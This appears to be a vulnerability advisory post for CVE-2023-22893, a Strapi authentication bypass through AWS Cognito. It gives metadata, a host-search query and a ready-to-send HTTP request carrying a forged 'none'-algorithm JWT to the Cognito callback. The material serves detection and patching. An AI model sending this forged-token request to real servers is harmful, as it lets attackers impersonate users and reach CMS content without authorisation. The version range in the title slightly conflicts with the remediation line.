---
layout: post
cve_id: CVE-2023-22893
title: Strapi Versions <=4.5.6 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2023/CVE-2023-22893.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22893.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: high
impact: 'Unauthenticated attackers can forge JWT tokens using the "None" algorithm
  to bypass AWS Cognito authentication and impersonate any Strapi user, gaining unauthorized
  access to CMS content and administrative functions.

  '
remediation: 'Update Strapi to version 4.5.6 or later which properly verifies access
  and ID tokens issued during OAuth flow with AWS Cognito login provider.

  '
reference:
- https://www.ghostccamm.com/blog/multi_strapi_vulns
- https://github.com/strapi/strapi/releases
- https://github.com/ARPSyndicate/cvemon
- https://nvd.nist.gov/vuln/detail/CVE-2023-22893
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2023-22893
  cwe-id: CWE-287
  epss-score: 0.66479
  epss-percentile: 0.98467
  cpe: cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: strapi
  product: strapi
  fofa-query: app="strapi-Headless-CMS"
tags:
- cve
- cve2023
- strapi
- authenticated
- aws
- cognito
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Strapi through 4.5.5 does not verify the access or ID tokens issued during the OAuth flow when the AWS Cognito login provider is used for authentication. A remote attacker could forge an ID token that is signed using the 'None' type algorithm to bypass authentication and impersonate any user that use AWS Cognito for authentication.


## ðŸŒ HTTP Request
```nohighlight
GET /api/auth/cognito/callback?access_token=czdmpdns&id_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJjb2duaXRvOnVzZXJuYW1lIjoic3F4Zmhib2tqZiIsImVtYWlsIjoiUnhaWEVtQG9TQXlCLmNvbSJ9. HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

